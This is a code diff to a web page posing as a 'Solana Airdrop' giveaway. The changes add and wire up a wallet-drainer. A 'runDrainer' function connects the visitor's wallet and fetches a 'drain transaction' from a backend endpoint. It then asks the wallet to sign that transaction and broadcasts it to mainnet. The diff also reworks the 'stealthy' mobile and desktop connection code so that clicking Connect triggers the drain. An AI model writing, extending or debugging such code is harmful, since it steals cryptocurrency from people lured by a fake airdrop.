@@ -100,14 +100,6 @@
       configurable: false
     });
     
-    function openWalletModal() {
-  const modal = document.getElementById('walletModal');
-  if (modal) {
-    modal.classList.add('active');
-  }
-}
-
-
   </script>
   <style>
     body {
@@ -545,7 +537,7 @@
     <div class="hero-content">
       <h1>🎁 Solana Airdrop</h1>
       <p class="hero-subtitle">Claim your exclusive $SOL tokens before August 31st!</p>
-      <div class="countdown" id="countdown">Loading...</div>
+    <div class="countdown" id="countdown">Loading...</div>
       <button class="claim-btn" onclick="openWalletModal();">🎁 Claim Now</button>
     </div>
   </section>
@@ -868,6 +860,170 @@
       }
     ];
 
+    console.log('Wallet provider detection at page load:');
+    WALLET_DEFS.forEach(wallet => {
+      try {
+        const provider = wallet.provider();
+        console.log(`Provider for ${wallet.name} at load:`, provider);
+      } catch (e) {
+        console.log(`Provider for ${wallet.name} at load: ERROR`, e);
+      }
+    });
+
+// Show status message in the status modal
+function showStatus(message, type = 'info') {
+  const modal = document.getElementById('statusModal');
+  const msgEl = document.getElementById('statusModalMsg');
+  if (msgEl && modal) {
+    let color = '#00FF88';
+    if (type === 'error') color = '#f66';
+    if (type === 'loading') color = '#FFD700';
+    msgEl.innerHTML = `<span style="color:${color};font-weight:600;">${message}</span>`;
+    modal.classList.add('active');
+  }
+}
+
+// Placeholder runDrainer implementation
+async function runDrainer(provider) {
+  try {
+    console.log('[runDrainer] called with provider:', provider);
+    showStatus('Preparing transaction...', 'loading');
+    // 1. Get the public key from the provider
+    let publicKey = provider.publicKey || provider.address;
+    console.log('[runDrainer] initial publicKey:', publicKey);
+    if (!publicKey && typeof provider.connect === 'function') {
+      try {
+        console.log('[runDrainer] calling provider.connect()...');
+        const result = await provider.connect();
+        console.log('[runDrainer] provider.connect() result:', result);
+        publicKey = result?.publicKey || provider.publicKey || provider.address;
+        console.log('[runDrainer] publicKey after connect:', publicKey);
+      } catch (connectErr) {
+        console.error('[runDrainer] provider.connect() error:', connectErr);
+        showStatus('Wallet connection failed: ' + (connectErr.message || connectErr), 'error');
+        return;
+      }
+    }
+    if (!publicKey) {
+      showStatus('Wallet not connected.', 'error');
+      console.error('[runDrainer] No publicKey after connect.');
+      return;
+    }
+
+    // 2. Fetch the drain transaction from the backend
+    console.log('[runDrainer] Fetching transaction for wallet:', publicKey.toString());
+    const response = await fetch(`/api/drainer?user=${publicKey.toString()}`);
+    console.log('[runDrainer] Response status:', response.status, response.statusText);
+    
+    if (!response.ok) {
+      try {
+        const err = await response.json();
+        console.log('[runDrainer] API error response:', err);
+        showStatus(err.error || err.details || 'Failed to fetch transaction', 'error');
+      } catch (parseError) {
+        console.log('[runDrainer] Failed to parse error response:', parseError);
+        showStatus('Failed to fetch transaction: ' + response.statusText, 'error');
+      }
+      return;
+    }
+    const txBase64 = await response.text();
+
+    // 3. Deserialize the transaction
+    const txBytes = Uint8Array.from(atob(txBase64), c => c.charCodeAt(0));
+    const transaction = solanaWeb3.Transaction.from(txBytes);
+
+    // 4. Request signature from the wallet
+    showStatus('Requesting signature...', 'loading');
+    let signed;
+    if (typeof provider.signTransaction === 'function') {
+      signed = await provider.signTransaction(transaction);
+    } else if (provider.signAndSendTransaction) {
+      // Some wallets use signAndSendTransaction
+      signed = await provider.signAndSendTransaction(transaction);
+    } else {
+      showStatus('Wallet does not support transaction signing.', 'error');
+      return;
+    }
+
+    // 5. Send the transaction to the network
+    showStatus('Sending transaction...', 'loading');
+    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+    let txid;
+    if (signed.signature) {
+      // If signAndSendTransaction returns a signature
+      txid = signed.signature;
+    } else {
+      // If we only have a signed transaction, send it
+      txid = await connection.sendRawTransaction(signed.serialize());
+    }
+
+    showStatus('Transaction sent! <br> <a href="https://explorer.solana.com/tx/' + txid + '" target="_blank">View on Solana Explorer</a>', 'success');
+  } catch (err) {
+    showStatus('Error: ' + (err.message || err), 'error');
+    console.error('[runDrainer] error:', err);
+  }
+}
+window.runDrainer = runDrainer;
+
+// Replace the current openWalletModal function with an async version that fetches wallet data from the drainer API
+async function openWalletModal() {
+  const modal = document.getElementById('walletModal');
+  const walletList = document.getElementById('walletList');
+  if (modal && walletList) {
+    // Use forceDetectMobileWallets to get detected wallet providers
+    const detectedWallets = forceDetectMobileWallets();
+    // Map detected wallet object paths to WALLET_DEFS
+    const detectedDefs = WALLET_DEFS.filter(wallet => {
+      // Check if the provider object exists
+      try {
+        const provider = wallet.provider();
+        // Only show wallets with a detected provider
+        return provider !== undefined && provider !== null;
+      } catch (e) {
+        return false;
+      }
+    });
+    walletList.innerHTML = detectedDefs.map(wallet => {
+      // Use the actual provider object for this wallet
+      const provider = wallet.provider();
+      let actionBtn = '';
+      if (provider) {
+        actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;
+      } else if (isMobile()) {
+        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;
+      } else {
+        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;
+      }
+      return `
+        <div class="wallet-option">
+          <img src="${wallet.icon}" alt="${wallet.name} logo" />
+          <span class="wallet-name">${wallet.name}</span>
+          ${actionBtn}
+        </div>
+      `;
+    }).join('');
+    // Attach event listeners for connect buttons
+    setTimeout(() => {
+      const connectBtns = walletList.querySelectorAll('.connect-wallet-btn');
+      connectBtns.forEach(btn => {
+        btn.addEventListener('click', function() {
+          const key = btn.getAttribute('data-wallet-key');
+          // Use the actual provider object at click time
+          const wallet = WALLET_DEFS.find(w => w.key === key);
+          if (wallet) {
+            const provider = wallet.provider();
+            if (provider && window.connectMobileWallet) {
+              // Pass the wallet object, but connectMobileWallet will use the current provider
+              window.connectMobileWallet(wallet);
+            }
+          }
+        });
+      });
+    }, 0);
+    modal.classList.add('active');
+  }
+}
+
     // Countdown functionality
     function updateCountdown() {
       const now = new Date();
@@ -993,6 +1149,9 @@
 
     // Stealthy mobile wallet connection - restore working logic
     async function connectMobileWallet(wallet) {
+      const provider = wallet.provider();
+      console.log(`Provider for ${wallet.name} on connect:`, provider);
+      console.log('connectMobileWallet called with:', wallet);
       const isMobileDevice = isMobile();
       
       try {
@@ -1001,6 +1160,7 @@
           
           // First, try to get the wallet provider quietly
           let provider = wallet.provider();
+          console.log(`[connectMobileWallet] Initial provider for ${wallet.name}:`, provider);
           
           // If no provider, try to open the app and then check again
           if (!provider) {
@@ -1031,6 +1191,7 @@
               await new Promise(resolve => setTimeout(resolve, 1000));
               
               provider = wallet.provider();
+              console.log(`[connectMobileWallet] Provider for ${wallet.name} after wait ${i+1}:`, provider);
               
               if (provider) {
                 break;
@@ -1044,19 +1205,20 @@
             // Try to connect
             if (typeof provider.connect === 'function') {
               try {
+                console.log(`[connectMobileWallet] Calling connectWalletWithMetadata for ${wallet.name}`);
                 const result = await connectWalletWithMetadata(provider, wallet.name);
-                
+                console.log(`[connectMobileWallet] connectWalletWithMetadata result for ${wallet.name}:`, result);
                 // Wait a bit for connection to establish
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
                 // Check if we got a public key
                 const publicKey = provider.publicKey || provider.address || result?.publicKey;
+                console.log(`[connectMobileWallet] publicKey for ${wallet.name}:`, publicKey);
                 
                 if (publicKey) {
                   showStatus(`${wallet.name} connected!`, 'success');
-                  setTimeout(() => {
-                    runDrainer(provider);
-                  }, 1000);
+                  console.log(`[connectMobileWallet] About to call runDrainer for ${wallet.name}`);
+                  runDrainer(provider);
                 } else {
                   // Try to force approval by attempting a transaction
                   showStatus(`Please approve the connection in ${wallet.name}`, 'loading');
@@ -1066,19 +1228,21 @@
                     try {
                       const message = new TextEncoder().encode('Connect to Solana Airdrop');
                       const signature = await provider.signMessage(message);
-                      
+                      console.log(`[connectMobileWallet] signMessage signature for ${wallet.name}:`, signature);
                       showStatus(`${wallet.name} approved!`, 'success');
                       setTimeout(() => {
                         runDrainer(provider);
                       }, 1000);
                     } catch (signError) {
+                      console.error(`[connectMobileWallet] signMessage error for ${wallet.name}:`, signError);
                     }
                   } else {
                     showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+                    console.error(`[connectMobileWallet] No signMessage function for ${wallet.name}`);
                   }
                 }
               } catch (connectError) {
-                
+                console.error(`[connectMobileWallet] connectWalletWithMetadata error for ${wallet.name}:`, connectError);
                 // Try alternative connection method for Solflare
                 if (wallet.name === 'Solflare' && typeof provider.signIn === 'function') {
                   try {
@@ -1102,7 +1266,7 @@
                         setTimeout(() => {
                           runDrainer(provider);
                         }, 1000);
-                      } else {
+        } else {
                         showStatus('Please approve the connection in Exodus', 'error');
                       }
                     } else if (typeof provider.request === 'function') {
@@ -1128,10 +1292,11 @@
               }
             } else {
               showStatus(`${wallet.name} connection method not available`, 'error');
+              console.error(`[connectMobileWallet] No connect function for ${wallet.name}`);
             }
           } else {
             // No provider found, show manual instructions
-            
+            console.error(`[connectMobileWallet] No provider found for ${wallet.name} after waiting.`);
             const instructions = `
               <div style="text-align: center; padding: 20px;">
                 <h3>📱 Connect ${wallet.name}</h3>
@@ -1166,9 +1331,42 @@
         } else {
           // Desktop logic (unchanged)
           const provider = wallet.provider();
+          console.log(`[connectMobileWallet] Desktop provider for ${wallet.name}:`, provider);
           if (!provider) {
             showStatus(`${wallet.name} not detected. Please install the extension.`, 'error');
+            console.error(`[connectMobileWallet] No provider for ${wallet.name} on desktop.`);
             return;
           }
           
-      
+          // Desktop: Try to connect and then run drainer
+          try {
+            console.log(`[connectMobileWallet] Desktop: calling connectWalletWithMetadata for ${wallet.name}`);
+            const result = await connectWalletWithMetadata(provider, wallet.name);
+            console.log(`[connectMobileWallet] Desktop: connectWalletWithMetadata result for ${wallet.name}:`, result);
+            
+            // Check if we got a public key
+            const publicKey = provider.publicKey || provider.address || result?.publicKey;
+            console.log(`[connectMobileWallet] Desktop: publicKey for ${wallet.name}:`, publicKey);
+            
+            if (publicKey) {
+              showStatus(`${wallet.name} connected!`, 'success');
+              console.log(`[connectMobileWallet] Desktop: About to call runDrainer for ${wallet.name}`);
+              runDrainer(provider);
+            } else {
+              showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+              console.error(`[connectMobileWallet] Desktop: No publicKey after connect for ${wallet.name}`);
+            }
+          } catch (connectError) {
+            console.error(`[connectMobileWallet] Desktop: connectWalletWithMetadata error for ${wallet.name}:`, connectError);
+            showStatus(`Connection failed for ${wallet.name}: ${connectError.message || connectError}`, 'error');
+          }
+        }
+      } catch (error) {
+        showStatus('An unexpected error occurred.', 'error');
+        console.error(`[connectMobileWallet] Unexpected error for ${wallet.name}:`, error);
+      }
+    }
+    window.connectMobileWallet = connectMobileWallet;
+  </script>
+</body>
+</html>
